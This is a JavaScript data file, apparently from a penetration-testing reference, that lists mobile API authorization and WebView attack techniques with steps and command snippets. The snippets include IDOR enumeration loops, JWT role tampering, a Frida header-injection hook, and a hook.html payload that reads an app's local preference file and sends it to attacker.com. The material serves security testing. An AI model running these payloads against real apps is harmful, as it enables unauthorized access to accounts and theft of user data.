export const mobileNetworkTechniques = [
  {
    id: 'mob-api-testing',
    title: 'Mobile API Testing & Authorization Flaws',
    subtitle: 'Test the backend API for IDOR, privilege escalation, and missing auth checks from a mobile context',
    tags: ['Burp Suite', 'IDOR', 'API testing', 'authorization', 'token replay', 'mobile API'],
    accentColor: 'orange',
    overview: 'Mobile apps communicate with backend APIs that frequently lack proper authorization. Once traffic is proxied through Burp Suite, all web application API attack techniques apply — plus mobile-specific patterns like device-ID spoofing and client-enforced access controls.',
    steps: [
      'Map all API endpoints using Burp Proxy history after fully exercising the app',
      'Test each endpoint with a lower-privilege account token to check server-side authorization',
      'Enumerate IDOR by replacing object IDs in requests with IDs belonging to other users',
      'Remove or modify JWT claims (role, user_id, subscription) and replay modified tokens',
      'Test device-bound controls: change User-Agent, X-Device-ID, or platform headers to bypass device restrictions',
      'Check for shadow API endpoints: mobile apps often have /v1/ endpoints not documented in web API docs',
      'Intercept and replay GraphQL queries/mutations with elevated scope fields',
    ],
    commands: [
      {
        title: 'Mobile API authorization testing',
        code: `# Export Burp history to a list of endpoints
# Burp → Target → Site Map → right-click → Save selected items

# Replay request with different account token (horizontal escalation)
curl -X GET "https://api.target.com/v1/user/12345/profile" \\
  -H "Authorization: Bearer VICTIM_TOKEN"

# IDOR — replace user ID
for id in {10000..10050}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \\
    "https://api.target.com/v1/users/$id" \\
    -H "Authorization: Bearer YOUR_TOKEN")
  echo "User $id: $status"
done

# JWT claim tampering (base64 decode → modify → resign or none alg)
TOKEN="eyJhbG..."
PAYLOAD=$(echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo $PAYLOAD | python3 -c "import sys,json; d=json.load(sys.stdin); d['role']='admin'; print(json.dumps(d))"

# Device ID spoofing
curl -X GET "https://api.target.com/v1/features" \\
  -H "Authorization: Bearer TOKEN" \\
  -H "X-Device-ID: 00000000-0000-0000-0000-000000000001" \\
  -H "X-Platform: ios" \\
  -H "X-App-Version: 9.9.9"

# Frida — hook API calls and modify request headers at runtime
Java.perform(function() {
  var OkHttpClient = Java.use("okhttp3.Request$Builder");
  OkHttpClient.build.implementation = function() {
    this.header("X-Admin-Override", "true");
    return this.build();
  };
});`
      }
    ]
  },
  {
    id: 'mob-webview',
    title: 'WebView Attacks',
    subtitle: 'Exploit JavaScript bridges, file access, and cross-origin issues in mobile WebViews',
    tags: ['WebView', 'JavaScript bridge', 'addJavascriptInterface', 'file:// access', 'XSS', 'intent:// scheme'],
    accentColor: 'orange',
    overview: 'Embedded WebViews with JavaScript bridges expose native app functionality to web content. Unsafe file:// access, overly permissive CORS, and XSS in the loaded URL can lead to full native code execution.',
    steps: [
      'Identify WebViews: search decompiled code for WebView, setJavaScriptEnabled(true), addJavascriptInterface',
      'Check if WebView loads attacker-controllable URLs via deep links or intents',
      'Test addJavascriptInterface: any loaded page can call all methods on the exposed Java object',
      'Test file:// scheme access: setAllowFileAccess(true) allows the page to read local files via XMLHttpRequest',
      'Inject XSS into the URL loaded in the WebView — the XSS context is trusted with bridge access',
      'Check shouldOverrideUrlLoading for intent:// scheme handling — allows launching arbitrary intents from web',
    ],
    commands: [
      {
        title: 'WebView exploitation',
        code: `# Detect WebViews in decompiled code
grep -r "setJavaScriptEnabled\|addJavascriptInterface\|setAllowFileAccess" output/ --include="*.java"

# Trigger WebView via deep link with attacker URL
adb shell am start -a android.intent.action.VIEW \\
  -d "target://webview?url=https://attacker.com/hook.html"

# hook.html — steal local file via JavaScript bridge
# Assuming bridge exposed as window.NativeBridge:
<script>
// Read local file via file:// if allowed
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///data/data/com.target.app/shared_prefs/user_prefs.xml", false);
xhr.send();
fetch("https://attacker.com/steal?data=" + btoa(xhr.responseText));

// If addJavascriptInterface: call bridge methods
window.NativeBridge.executeCommand("cat /data/data/com.target.app/databases/main.db");
</script>

# Frida — dump all WebView URLs loaded
Java.perform(function() {
  var WebViewClient = Java.use("android.webkit.WebViewClient");
  WebViewClient.shouldOverrideUrlLoading.overload(
    "android.webkit.WebView","java.lang.String"
  ).implementation = function(view, url) {
    console.log("[WebView] Loading: " + url);
    return this.shouldOverrideUrlLoading(view, url);
  };
});

# iOS WKWebView — check message handler names
grep -r "addScriptMessageHandler\|evaluateJavaScript" output/ --include="*.swift"
# Message handlers are callable from JS: window.webkit.messageHandlers.<name>.postMessage(...)`
      }
    ]
  },
];